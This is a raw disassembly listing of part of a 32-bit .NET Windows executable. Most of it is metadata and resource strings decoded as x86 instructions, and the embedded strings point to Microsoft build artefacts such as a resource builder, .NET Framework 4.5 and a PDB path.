  404871:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  404878:	pop    esi
  40487a:	pop    es
  40487b:	ja     0x4048cc
  40487d:	sub    eax,ebp
  40487f:	xor    cl,BYTE PTR [esi]
  404881:	xchg   edx,eax
  404882:	jmp    0xc021:0xe8e4ec05
  404889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488a:	out    dx,eax
  40488b:	call   0x4c9cad81
  404890:	or     al,0x93
  404892:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  404899:	stos   BYTE PTR es:[edi],al
  40489a:	gs sub al,0x1d
  40489d:	cli    
  40489e:	(bad)  
  40489f:	cmp    eax,0x2d6f5d74
  4048a4:	in     eax,0xf1
  4048a6:	jle    0x404906
  4048a8:	scas   eax,DWORD PTR es:[edi]
  4048a9:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4048b1:	inc    ebx
  4048b2:	sbb    BYTE PTR gs:[eax],ah
  4048b5:	ins    DWORD PTR es:[edi],dx
  4048b6:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  4048bd:	add    al,0x0
  4048bf:	add    BYTE PTR [edx],dl
  4048c1:	ins    DWORD PTR es:[edi],dx
  4048c2:	add    al,0x20
  4048c4:	add    BYTE PTR [edx],dl
  4048c6:	adc    eax,0x1012005
  4048cb:	adc    dl,BYTE PTR ds:0x12000004
  4048d1:	jne    0x4048d6
  4048d3:	and    BYTE PTR [eax],al
  4048d5:	or     BYTE PTR [eax+eiz*1],al
  4048d8:	add    BYTE PTR [edx],dl
  4048da:	jns    0x4048e0
  4048dc:	add    BYTE PTR [ecx],al
  4048de:	add    cl,BYTE PTR [esi]
  4048e0:	add    al,0x0
  4048e2:	add    DWORD PTR [ecx],eax
  4048e4:	or     BYTE PTR [esi],al
  4048e6:	add    BYTE PTR [ecx],al
  4048e8:	adc    al,BYTE PTR [eax+0x80e89]
  4048ee:	add    DWORD PTR [edx],edx
  4048f0:	add    BYTE PTR [ebp+0x8898012],0x20
  4048f7:	add    eax,DWORD PTR [ecx]
  4048f9:	adc    al,BYTE PTR [eax+0x9020e85]
  4048ff:	add    BYTE PTR [ebx],al
  404901:	push   cs
  404902:	adc    al,BYTE PTR [eax+0x1c1d0e95]
  404908:	add    al,0x0
  40490a:	add    DWORD PTR [ecx],eax
  40490c:	push   cs
  40490d:	pop    es
  40490e:	and    BYTE PTR [edx],al
  404910:	add    cl,BYTE PTR [esi]
  404912:	adc    DWORD PTR [eax+0x200399],eax
  404918:	add    al,BYTE PTR ds:0x1c010220
  40491e:	sbb    BYTE PTR [esi],al
  404920:	and    BYTE PTR [ecx],al
  404922:	add    DWORD PTR [edx],edx
  404924:	sbb    BYTE PTR [ebp+0x12000005],0x80
  40492b:	mov    eax,ds:0xe002003
  404930:	adc    al,BYTE PTR [edi]
  404932:	or     BYTE PTR [eax],cl
  404934:	adc    al,BYTE PTR [eax+0xe091285]
  40493a:	adc    al,BYTE PTR [eax+0x1d1c1da5]
  404940:	sbb    al,0x1d
  404942:	sbb    al,0x4
  404944:	and    BYTE PTR [ecx],al
  404946:	add    ecx,DWORD PTR [eax]
  404948:	push   es
  404949:	and    BYTE PTR [ecx],al
  40494b:	sbb    eax,0x4031d0e
  404950:	and    BYTE PTR [ecx],al
  404952:	push   cs
  404953:	or     BYTE PTR [ecx+eax*1],al
  404956:	add    BYTE PTR [eax],al
  404958:	add    BYTE PTR [eax],cl
  40495a:	push   es
  40495b:	adc    eax,0x2b58012
  404960:	push   cs
  404961:	or     BYTE PTR [edi],al
  404963:	adc    eax,0x2b58012
  404968:	push   cs
  404969:	or     BYTE PTR [edi],al
  40496b:	and    BYTE PTR [edx],al
  40496d:	add    DWORD PTR [ebx],edx
  40496f:	add    BYTE PTR [ebx],dl
  404971:	add    DWORD PTR [eax],ecx
  404973:	and    BYTE PTR [edx],al
  404975:	add    dl,BYTE PTR [ebx]
  404977:	add    BYTE PTR [eax],dl
  404979:	adc    eax,DWORD PTR [ecx]
  40497b:	add    eax,0xe020200
  404980:	push   cs
  404981:	add    eax,0x1c0e0200
  404986:	sbb    al,0x13
  404988:	pop    es
  404989:	or     al,0xe
  40498b:	sbb    eax,0xe0e0e0e
  404990:	sbb    eax,0x31d080e
  404995:	push   cs
  404996:	or     BYTE PTR ds:0x401c1d1c,bl
  40499c:	add    DWORD PTR [eax],eax
  40499e:	xor    edx,DWORD PTR [ebx+0x79]
  4049a1:	jae    0x404a17
  4049a3:	gs ins DWORD PTR es:[edi],dx
  4049a5:	cs push edx
  4049a7:	gs jae 0x404a19
  4049aa:	jne    0x404a1e
  4049ac:	arpl   WORD PTR [ebp+0x73],sp
  4049af:	cs push esp
  4049b1:	outs   dx,DWORD PTR ds:[esi]
  4049b2:	outs   dx,DWORD PTR ds:[esi]
  4049b3:	ins    BYTE PTR es:[edi],dx
  4049b4:	jae    0x4049e4
  4049b6:	push   ebx
  4049b7:	je     0x404a2b
  4049b9:	outs   dx,DWORD PTR ds:[esi]
  4049ba:	outs   dx,BYTE PTR ds:[esi]
  4049bb:	ins    BYTE PTR es:[di],dx
  4049bd:	jns    0x404a13
  4049bf:	jns    0x404a31
  4049c1:	gs fs push edx
  4049c4:	gs jae 0x404a36
  4049c7:	jne    0x404a3b
  4049c9:	arpl   WORD PTR [ebp+0x42],sp
  4049cc:	jne    0x404a37
  4049ce:	ins    BYTE PTR es:[edi],dx
  4049cf:	fs gs jb 0x4049da
  4049d3:	xor    al,0x2e
  4049d5:	xor    BYTE PTR [esi],ch
  4049d7:	xor    BYTE PTR [esi],ch
  4049d9:	xor    BYTE PTR [eax],al
  4049db:	add    BYTE PTR ds:0x1c020200,al
  4049e1:	sbb    al,0x8
  4049e3:	add    BYTE PTR [ecx],al
  4049e5:	adc    al,BYTE PTR [eax-0x3a7fee3f]
  4049eb:	add    eax,0x80120020
  4049f0:	leave  
  4049f1:	pop    es
  4049f2:	and    BYTE PTR [edx],al
  4049f4:	add    DWORD PTR [esi],ecx
  4049f6:	adc    al,BYTE PTR [eax+0x10704c9]
  4049fc:	adc    dl,BYTE PTR [ecx]
  4049fe:	push   es
  4049ff:	and    BYTE PTR [edx],al
  404a01:	push   cs
  404a02:	push   cs
  404a03:	adc    dl,BYTE PTR ds:0x1012006
  404a09:	adc    DWORD PTR [eax+0x108d1],eax
  404a0f:	add    al,BYTE PTR [eax]
  404a11:	add    BYTE PTR [eax],al
  404a13:	add    BYTE PTR [eax],al
  404a15:	aaa    
  404a16:	add    DWORD PTR [eax],eax
  404a18:	sbb    ch,BYTE PTR [esi]
  404a1a:	dec    esi
  404a1b:	inc    ebp
  404a1c:	push   esp
  404a1d:	inc    esi
  404a1e:	jb     0x404a81
  404a20:	ins    DWORD PTR es:[edi],dx
  404a21:	gs ja  0x404a93
  404a24:	jb     0x404a91
  404a26:	sub    al,0x56
  404a28:	gs jb  0x404a9e
  404a2b:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  404a32:	xor    eax,0xe540001
  404a37:	adc    al,0x46
  404a39:	jb     0x404a9c
  404a3b:	ins    DWORD PTR es:[edi],dx
  404a3c:	gs ja  0x404aae
  404a3f:	jb     0x404aac
  404a41:	inc    esp
  404a42:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  404a49:	popa   
  404a4a:	ins    DWORD PTR es:[edi],dx
  404a4b:	add    BYTE PTR gs:0x1,al
  404a52:	add    BYTE PTR ds:0x10001,al
  404a58:	add    BYTE PTR [ecx],bl
  404a5a:	add    DWORD PTR [eax],eax
  404a5c:	adc    al,0x54
  404a5e:	data16 jae 0x404aa5
  404a61:	gs ins BYTE PTR es:[edi],dx
  404a63:	gs je  0x404acb
  404a66:	push   eax
  404a67:	jb     0x404ad8
  404a69:	push   0x65
  404a6b:	arpl   WORD PTR [esi+ebp*1+0x65],si
  404a6f:	js     0x404ad6
  404a71:	add    BYTE PTR [eax],al
  404a73:	sbb    al,BYTE PTR [ecx]
  404a75:	add    BYTE PTR ds:0x7263694d,dl
  404a7b:	outs   dx,DWORD PTR ds:[esi]
  404a7c:	jae    0x404aed
  404a7e:	data16 je 0x404aa1
  404a81:	inc    ebx
  404a82:	outs   dx,DWORD PTR ds:[esi]
  404a83:	jb     0x404af5
  404a85:	outs   dx,DWORD PTR ds:[esi]
  404a86:	jb     0x404ae9
  404a88:	je     0x404af3
  404a8a:	outs   dx,DWORD PTR ds:[esi]
  404a8b:	outs   dx,BYTE PTR ds:[esi]
  404a8c:	add    BYTE PTR [eax],al
  404a8e:	and    eax,0x4d200001
  404a93:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404a9a:	je     0x404a5e
  404a9c:	scas   al,BYTE PTR es:[edi]
  404a9d:	and    BYTE PTR [esi+0x69],dl
  404aa0:	jae    0x404b17
  404aa2:	popa   
  404aa3:	ins    BYTE PTR es:[edi],dx
  404aa4:	and    BYTE PTR [ebx+0x74],dl
  404aa7:	jne    0x404b0d
  404aa9:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  404ab0:	xor    DWORD PTR [edx],esi
  404ab2:	add    BYTE PTR [eax],al
  404ab4:	xor    eax,DWORD PTR [ecx]
  404ab6:	add    BYTE PTR [esi],ch
  404ab8:	ret    0x20a9
  404abb:	dec    ebp
  404abc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404ac3:	je     0x404ae5
  404ac5:	inc    ebx
  404ac6:	outs   dx,DWORD PTR ds:[esi]
  404ac7:	jb     0x404b39
  404ac9:	outs   dx,DWORD PTR ds:[esi]
  404aca:	jb     0x404b2d
  404acc:	je     0x404b37
  404ace:	outs   dx,DWORD PTR ds:[esi]
  404acf:	outs   dx,BYTE PTR ds:[esi]
  404ad0:	and    BYTE PTR cs:[ecx+0x6c],al
  404ad4:	ins    BYTE PTR es:[edi],dx
  404ad5:	and    BYTE PTR [edx+0x69],dh
  404ad8:	addr16 push 0x72207374
  404ade:	gs jae 0x404b46
  404ae1:	jb     0x404b59
  404ae3:	gs fs add BYTE PTR cs:[eax],al
  404ae8:	adc    DWORD PTR [ecx],eax
  404aea:	add    BYTE PTR [ecx+esi*1],cl
  404aed:	xor    DWORD PTR [esi],ebp
  404aef:	xor    BYTE PTR [esi],ch
  404af1:	xor    eax,0x37323730
  404af6:	xor    DWORD PTR cs:[eax],eax
  404af9:	add    BYTE PTR ds:0x31080001,cl
  404aff:	xor    DWORD PTR [esi],ebp
  404b01:	xor    BYTE PTR [esi],ch
  404b03:	xor    BYTE PTR [esi],ch
  404b05:	xor    BYTE PTR [eax],al
  404b07:	add    BYTE PTR [edx],cl
  404b09:	add    DWORD PTR [eax],eax
  404b0b:	add    eax,0x552d6e65
  404b10:	push   ebx
  404b11:	add    BYTE PTR [eax],al
  404b13:	sub    al,BYTE PTR [ecx]
  404b15:	add    BYTE PTR ds:0x645c3a46,ah
  404b1b:	fs pop esp
  404b1d:	je     0x404b8e
  404b1f:	outs   dx,DWORD PTR ds:[esi]
  404b20:	ins    BYTE PTR es:[edi],dx
  404b21:	jae    0x404b7f
  404b23:	fs gs jbe 0x404b8b
  404b27:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  404b2e:	ins    BYTE PTR es:[edi],dx
  404b2f:	push   eax
  404b30:	jne    0x404b94
  404b32:	ins    BYTE PTR es:[edi],dx
  404b33:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  404b3a:	outs   dx,BYTE PTR ds:[esi]
  404b3b:	imul   eax,DWORD PTR [eax],0x0
  404b3e:	or     DWORD PTR [eax+0x1],0x0
  404b42:	add    BYTE PTR [eax+0x30],0x30
  404b46:	xor    dh,BYTE PTR [eax+esi*1]
  404b49:	xor    BYTE PTR [eax],dh
  404b4b:	xor    BYTE PTR [eax],dh
  404b4d:	arpl   WORD PTR [eax],di
  404b4f:	xor    BYTE PTR [eax],dh
  404b51:	xor    BYTE PTR [eax],dh
  404b53:	xor    BYTE PTR [ecx],dh
  404b55:	xor    al,0x30
  404b57:	xor    DWORD PTR [eax],esi
  404b59:	xor    BYTE PTR [eax],dh
  404b5b:	xor    BYTE PTR [eax],dh
  404b5d:	xor    BYTE PTR ss:[edx],dh
  404b60:	xor    BYTE PTR [eax],dh
  404b62:	xor    BYTE PTR [eax],dh
  404b64:	xor    BYTE PTR [eax],dh
  404b66:	xor    dh,BYTE PTR [eax+esi*1]
  404b69:	xor    BYTE PTR [eax],dh
  404b6b:	xor    BYTE PTR ds:0x34333532,dh
  404b71:	xor    DWORD PTR [ebx],esi
  404b73:	xor    DWORD PTR [eax],esi
  404b75:	xor    BYTE PTR [eax],dh
  404b77:	cmp    BYTE PTR [eax],dh
  404b79:	xor    BYTE PTR [eax],dh
  404b7b:	xor    BYTE PTR [eax],dh
  404b7d:	xor    DWORD PTR [eax],esi
  404b7f:	xor    BYTE PTR [eax],dh
  404b81:	xor    DWORD PTR [eax],esi
  404b83:	xor    BYTE PTR [esi],dh
  404b85:	xor    DWORD PTR [ebx],esi
  404b87:	xor    edi,DWORD PTR [ecx]
  404b89:	cmp    DWORD PTR [ecx+0x66],esp
  404b8c:	xor    WORD PTR [eax],di
  404b8f:	xor    WORD PTR gs:[ecx+0x32],sp
  404b94:	arpl   WORD PTR [edx],si
  404b96:	xor    eax,0x32613431
  404b9b:	aaa    
  404b9c:	xor    esp,DWORD PTR [ecx+0x34]
  404b9f:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  404ba3:	xor    al,0x32
  404ba5:	bound  esi,QWORD PTR [edi]
  404ba7:	xor    dh,BYTE PTR [ebx]
  404ba9:	xor    dh,BYTE PTR [ecx]
  404bab:	xor    WORD PTR [edi],si
  404bae:	xor    eax,0x32303137
  404bb3:	cmp    WORD PTR fs:[ebp+0x62],sp
  404bb8:	popa   
  404bb9:	fs popa 
  404bbb:	cmp    DWORD PTR ss:[ecx],edi
  404bbe:	xor    dh,BYTE PTR [ebx]
  404bc0:	xor    dh,BYTE PTR gs:[edi]
  404bc3:	xor    edi,DWORD PTR [eax]
  404bc5:	xor    al,0x30
  404bc7:	arpl   WORD PTR ss:[edx],si
  404bca:	xor    DWORD PTR [ebp+0x35],esp
  404bcd:	bound  edi,QWORD PTR [eax]
  404bcf:	xor    BYTE PTR [ecx],dh
  404bd1:	xor    eax,0x62613235
  404bd6:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  404bda:	xor    BYTE PTR [ecx+0x36],ah
  404bdd:	xor    eax,0x35333261
  404be2:	xor    BYTE PTR gs:[eax],dh
  404be5:	xor    DWORD PTR [ecx+0x63],esp
  404be8:	cmp    DWORD PTR [ecx+0x64],esp
  404beb:	arpl   WORD PTR [edx],si
  404bed:	xor    eax,0x38643266
  404bf2:	xor    DWORD PTR [ecx],esi
  404bf4:	bound  esi,QWORD PTR gs:[eax]
  404bf7:	cmp    DWORD PTR [ecx+edi*1],esi
  404bfa:	ss popa 
  404bfc:	xor    al,0x63
  404bfe:	ss popa 
  404c00:	xor    eax,0x36346439
  404c05:	xor    DWORD PTR [ecx],edi
  404c07:	xor    eax,0x36633938
  404c0c:	cmp    DWORD PTR [esi+0x35],esp
  404c0f:	bound  esp,QWORD PTR [ecx+0x66]
  404c12:	xor    BYTE PTR [ebx+0x34],ah
  404c15:	xor    DWORD PTR [edi],esi
  404c17:	cmp    DWORD PTR [ecx+0x34],esp
  404c1a:	aaa    
  404c1b:	xor    esi,DWORD PTR [ecx]
  404c1d:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  404c21:	xor    eax,0x64633535
  404c26:	xor    BYTE PTR [eax],dh
  404c28:	ss popa 
  404c2a:	arpl   WORD PTR [ebx+0x38],sp
  404c2d:	bound  esi,QWORD PTR ds:0x66393539
  404c33:	xor    ah,BYTE PTR [edx+0x64]
  404c36:	ss xor DWORD PTR gs:[eax],esi
  404c3a:	xor    esi,DWORD PTR gs:[esi]
  404c3d:	xor    BYTE PTR [ebx+0x33],ah
  404c40:	xor    al,0x35
  404c42:	xor    esi,DWORD PTR [edi]
  404c44:	popa   
  404c45:	xor    DWORD PTR [edx+esi*1+0x36],esp
  404c49:	ss fs popa 
  404c4c:	cmp    BYTE PTR [eax],dh
  404c4e:	cmp    BYTE PTR ds:0x35363538,dh
  404c54:	cmp    BYTE PTR [ebx],dh
  404c56:	arpl   WORD PTR [eax],di
  404c58:	xor    eax,0x64313864
  404c5d:	popa   
  404c5e:	aaa    
  404c5f:	xor    sp,WORD PTR [ebp+0x63]
  404c63:	xor    BYTE PTR [ecx],dh
  404c65:	gs cmp DWORD PTR fs:0x35633436,esi
  404c6d:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  404c71:	fs aaa 
  404c73:	xor    DWORD PTR [ebx],esi
  404c75:	arpl   WORD PTR [eax+esi*1+0x31],sp
  404c79:	aaa    
  404c7a:	xor    ah,BYTE PTR [ebx+0x38]
  404c7d:	xor    dh,BYTE PTR gs:[ebx]
  404c80:	popa   
  404c81:	xor    DWORD PTR [eax],esi
  404c83:	data16 xor BYTE PTR [edx],dh
  404c86:	xor    edi,DWORD PTR [ecx]
  404c88:	bound  edi,QWORD PTR [eax]
  404c8a:	xor    BYTE PTR [ebx+0x39],ah
  404c8d:	bound  esi,QWORD PTR ss:[eax]
  404c90:	aaa    
  404c91:	aaa    
  404c92:	xor    esi,DWORD PTR [esi]
  404c94:	xor    ax,0x3864
  404c98:	bound  esi,QWORD PTR [eax]
  404c9a:	xor    dh,BYTE PTR [edx]
  404c9c:	xor    eax,0x34613234
  404ca1:	gs aaa 
  404ca3:	xor    al,0x32
  404ca5:	xor    eax,0x66356131
  404caa:	xor    al,0x33
  404cac:	xor    bh,BYTE PTR [eax]
  404cae:	xor    dh,BYTE PTR [ebx+esi*1]
  404cb1:	xor    DWORD PTR [eax],edi
  404cb3:	bound  esi,QWORD PTR [ebx]
  404cb5:	xor    eax,0x35613933
  404cba:	popa   
  404cbb:	xor    BYTE PTR [eax],bh
  404cbd:	aaa    
  404cbe:	data16 cmp BYTE PTR [ebp+0x35],ah
  404cc2:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  404cc6:	xor    DWORD PTR [ebx],esi
  404cc8:	xor    eax,0x61633966
  404ccd:	xor    al,0x37
  404ccf:	xor    sp,WORD PTR [edx+0x62]
  404cd3:	xor    ah,BYTE PTR [ebp+0x31]
  404cd6:	xor    BYTE PTR [ecx+0x66],ah
  404cd9:	data16 xor BYTE PTR [ecx+0x66],ah
  404cdd:	xor    BYTE PTR [eax],bh
  404cdf:	xor    al,0x39
  404ce1:	xor    eax,0x62663430
  404ce6:	aaa    
  404ce7:	arpl   WORD PTR [ebp+0x61],sp
  404cea:	xor    esp,DWORD PTR [esi+0x66]
  404ced:	xor    DWORD PTR [ecx],edi
  404cef:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  404cf3:	fs xor BYTE PTR gs:[ebp+0x64],ah
  404cf8:	popa   
  404cf9:	fs ss xor al,0x63
  404cfd:	cmp    BYTE PTR ss:[ebp+0x66],ah
  404d01:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  404d06:	xor    eax,0x30336436
  404d0b:	xor    ah,BYTE PTR [ecx+0x64]
  404d0e:	xor    eax,0x36646635
  404d13:	cmp    BYTE PTR gs:[eax],dh
  404d16:	xor    si,WORD PTR [eax]
  404d19:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  404d1d:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  404d22:	cmp    DWORD PTR gs:0x38353633,esi
  404d29:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  404d31:	bound  esi,QWORD PTR ds:0x63363366
  404d37:	xor    eax,0x66653234
  404d3c:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  404d41:	data16 cmp BYTE PTR [eax],bh
  404d44:	cmp    BYTE PTR ds:0x33643833,dh
  404d4a:	aaa    
  404d4b:	xor    al,0x63
  404d4d:	xor    WORD PTR gs:[eax],si
  404d51:	ss popa 
  404d53:	arpl   WORD PTR [esi+0x37],sp
  404d56:	cmp    DWORD PTR fs:[ebx],esi
  404d59:	popa   
  404d5a:	xor    al,0x34
  404d5c:	xor    al,0x35
  404d5e:	arpl   WORD PTR [ebx],si
  404d60:	arpl   WORD PTR [edi],si
  404d62:	xor    esp,DWORD PTR [ebx+0x64]
  404d65:	cmp    DWORD PTR [ecx],esi
  404d67:	xor    DWORD PTR [esi+0x30],esp
  404d6a:	xor    eax,0x61613137
  404d6f:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  404d74:	fs popa 
  404d76:	xor    DWORD PTR [edx],esi
  404d78:	bound  esi,QWORD PTR [ecx]
  404d7a:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  404d7e:	arpl   WORD PTR [ebx],si
  404d80:	aaa    
  404d81:	xor    eax,0x813362
  404d86:	popa   
  404d87:	xor    eax,0x36363861
  404d8c:	xor    DWORD PTR gs:[ebp+0x65],esp
  404d90:	xor    DWORD PTR [eax],edi
  404d92:	data16 cmp BYTE PTR ss:[eax],dh
  404d96:	aaa    
  404d97:	ss cmp BYTE PTR ss:[edx],dh
  404d9b:	xor    BYTE PTR [ecx],bh
  404d9d:	xor    sp,WORD PTR [edx+0x31]
  404da1:	xor    DWORD PTR [edx],esi
  404da3:	xor    esi,DWORD PTR [esi]
  404da5:	popa   
  404da6:	arpl   WORD PTR [ebp+0x35],sp
  404da9:	xor    dh,BYTE PTR gs:[ecx]
  404dac:	xor    WORD PTR [ecx],si
  404daf:	aaa    
  404db0:	cmp    BYTE PTR [eax],dh
  404db2:	xor    esp,DWORD PTR [ecx+0x33]
  404db5:	xor    DWORD PTR [ebx+esi*1],esi
  404db8:	popa   
  404db9:	bound  esp,QWORD PTR [edx+0x31]
  404dbc:	xor    dh,BYTE PTR [esi]
  404dbe:	fs xor BYTE PTR fs:[ebx],dh
  404dc2:	xor    eax,0x32643764
  404dc7:	data16 cmp BYTE PTR [edi],dh
  404dca:	bound  esi,QWORD PTR ss:[esi]
  404dcd:	cmp    DWORD PTR [ebx],esi
  404dcf:	cmp    BYTE PTR [ecx+0x61],ah
  404dd2:	data16 xor ah,BYTE PTR [ebp+0x65]
  404dd6:	xor    esi,DWORD PTR [ecx+esi*1]
  404dd9:	xor    al,0x64
  404ddb:	xor    eax,0x64303234
  404de0:	aaa    
  404de1:	xor    eax,0x31323633
  404de6:	xor    al,0x30
  404de8:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  404dec:	xor    al,0x61
  404dee:	xor    al,0x39
  404df0:	arpl   WORD PTR [eax+edi*1],si
  404df3:	arpl   WORD PTR ss:[ebp+0x31],sp
  404df7:	xor    esi,DWORD PTR [ebx+esi*1]
  404dfa:	xor    BYTE PTR [eax],dh
  404dfc:	popa   
  404dfd:	xor    dh,BYTE PTR [ecx]
  404dff:	xor    BYTE PTR [esi],dh
  404e01:	popa   
  404e02:	bound  esi,QWORD PTR fs:[esi]
  404e05:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  404e09:	xor    esi,DWORD PTR [ebx]
  404e0b:	xor    eax,0x65663039
  404e10:	data16 cmp BYTE PTR [ecx+0x64],ah
  404e14:	xor    eax,0x63333463
  404e19:	bound  esp,QWORD PTR [ecx+0x38]
  404e1c:	xor    dh,BYTE PTR [edx]
  404e1e:	cmp    DWORD PTR [eax],esi
  404e20:	arpl   WORD PTR fs:[ecx+edi*1],si
  404e24:	xor    eax,0x66653033
  404e29:	data16 cmp BYTE PTR fs:[esi],dh
  404e2d:	xor    eax,0x39643332
  404e32:	xor    al,0x38
  404e34:	xor    esp,DWORD PTR [ebx+0x30]
  404e37:	xor    BYTE PTR [esi+0x34],ah
  404e3a:	xor    eax,0x34666138
  404e3f:	cmp    BYTE PTR ss:[ecx],bh
  404e42:	xor    BYTE PTR [eax],dh
  404e44:	xor    esi,DWORD PTR [esi]
  404e46:	bound  esi,QWORD PTR [eax]
  404e48:	xor    ah,BYTE PTR gs:[ebx+0x36]
  404e4c:	xor    DWORD PTR [eax+esi*1+0x37],esp
  404e50:	aaa    
  404e51:	fs aaa 
  404e53:	bound  sp,DWORD PTR [ecx+0x63]
  404e57:	xor    al,0x36
  404e59:	aaa    
  404e5a:	popa   
  404e5b:	xor    eax,0x62653630
  404e60:	popa   
  404e61:	xor    bh,BYTE PTR [ecx]
  404e63:	gs xor al,0x36
  404e66:	aaa    
  404e67:	popa   
  404e68:	cmp    BYTE PTR [edi],dh
  404e6a:	xor    DWORD PTR [ecx],edi
  404e6c:	cmp    BYTE PTR [edx+0x30],ah
  404e6f:	xor    eax,0x34376333
  404e74:	cmp    DWORD PTR [ecx+0x61],esp
  404e77:	xor    ah,BYTE PTR [ecx+0x34]
  404e7a:	xor    bh,BYTE PTR fs:[eax]
  404e7d:	xor    al,0x30
  404e7f:	arpl   WORD PTR [edi],si
  404e81:	cmp    BYTE PTR [eiz*2+0x6436],dh
  404e88:	push   ds
  404e89:	add    DWORD PTR [eax],eax
  404e8b:	add    DWORD PTR [eax],eax
  404e8d:	push   esp
  404e8e:	add    dl,BYTE PTR [esi]
  404e90:	push   edi
  404e91:	jb     0x404ef4
  404e93:	jo     0x404ee3
  404e95:	outs   dx,DWORD PTR ds:[esi]
  404e96:	outs   dx,BYTE PTR ds:[esi]
  404e97:	inc    ebp
  404e98:	js     0x404efd
  404e9a:	gs jo  0x404f11
  404e9d:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  404ea4:	ja     0x404f19
  404ea6:	add    DWORD PTR [eax],ecx
  404ea8:	add    DWORD PTR [eax],eax
  404eaa:	or     BYTE PTR [eax],al
	...
  404eb4:	jmp    0x404e95
  404eb6:	adc    DWORD PTR [eax+0x0],edx
  404eb9:	add    BYTE PTR [eax],al
  404ebb:	add    BYTE PTR [edx],al
  404ebd:	add    BYTE PTR [eax],al
  404ebf:	add    BYTE PTR [ecx+eax*1],bl
  404ec2:	add    BYTE PTR [eax],al
  404ec4:	int3   
  404ec5:	dec    esi
  404ec6:	add    BYTE PTR [eax],al
  404ec8:	int3   
  404ec9:	xor    BYTE PTR [eax],al
  404ecb:	add    BYTE PTR [edx+0x53],dl
  404ece:	inc    esp
  404ecf:	push   ebx
  404ed0:	sbb    eax,0xb2647661
  404ed5:	xor    BYTE PTR [ebp+ecx*2-0x55680f4c],dh
  404edc:	jl     0x404f07
  404ede:	adc    dl,dh
  404ee0:	add    DWORD PTR [eax],eax
  404ee2:	add    BYTE PTR [eax],al
  404ee4:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  404ee9:	outs   dx,BYTE PTR ds:[esi]
  404eea:	popa   
  404eeb:	jb     0x404f56
  404eed:	gs jae 0x404f4c
  404ef0:	dec    ecx
  404ef1:	outs   dx,BYTE PTR ds:[esi]
  404ef2:	je     0x404f59
  404ef4:	jb     0x404f63
  404ef6:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  404eff:	gs je  0x404f5e
  404f02:	je     0x404f6a
  404f04:	jae    0x404f6a
  404f06:	gs ins BYTE PTR es:[edi],dx
  404f08:	gs je  0x404f70
  404f0b:	jo     0x404f7f
  404f0d:	outs   dx,DWORD PTR ds:[esi]
  404f0e:	push   0x65
  404f10:	arpl   WORD PTR [esi+ebp*1+0x63],si
  404f14:	jae    0x404f86
  404f16:	jb     0x404f87
  404f18:	push   0x5f
  404f1a:	xor    DWORD PTR [eax+esi*1],esi
  404f1d:	aaa    
  404f1e:	xor    al,0x30
  404f20:	cmp    BYTE PTR [ecx],bh
  404f22:	xor    esi,DWORD PTR [ecx]
  404f24:	pop    esp
  404f25:	outs   dx,DWORD PTR ds:[esi]
  404f26:	bound  ebp,QWORD PTR [edx+0x72]
  404f29:	pop    esp
  404f2a:	js     0x404f64
  404f2c:	ss pop esp
  404f2e:	push   esp
  404f2f:	data16 jae 0x404f76
  404f32:	gs ins BYTE PTR es:[edi],dx
  404f34:	gs je  0x404f9c
  404f37:	push   eax
  404f38:	jb     0x404fa9
  404f3a:	push   0x65
  404f3c:	arpl   WORD PTR [esi+ebp*1+0x70],si
  404f40:	bound  eax,QWORD PTR fs:[eax]
	...
  404fe7:	add    BYTE PTR [eax],dl
  404fe9:	push   eax
	...
  404ff2:	add    BYTE PTR [eax],al
  404ff4:	cs push eax
  404ff6:	add    BYTE PTR [eax],al
  404ff8:	add    BYTE PTR [eax],ah
	...
  40500e:	add    BYTE PTR [eax],al
  405010:	and    BYTE PTR [eax+0x0],dl
	...
  40501f:	add    BYTE PTR [eax],al
  405021:	add    BYTE PTR [edi+0x43],bl
  405024:	outs   dx,DWORD PTR ds:[esi]
  405025:	jb     0x40506c
  405027:	js     0x40508e
  405029:	dec    ebp
  40502a:	popa   
  40502b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  405032:	jb     0x405099
  405034:	gs cs fs ins BYTE PTR es:[edi],dx
  405038:	ins    BYTE PTR es:[edi],dx
  405039:	add    BYTE PTR [eax],al
  40503b:	add    BYTE PTR [eax],al
  40503d:	add    bh,bh
  40503f:	and    eax,0x402000
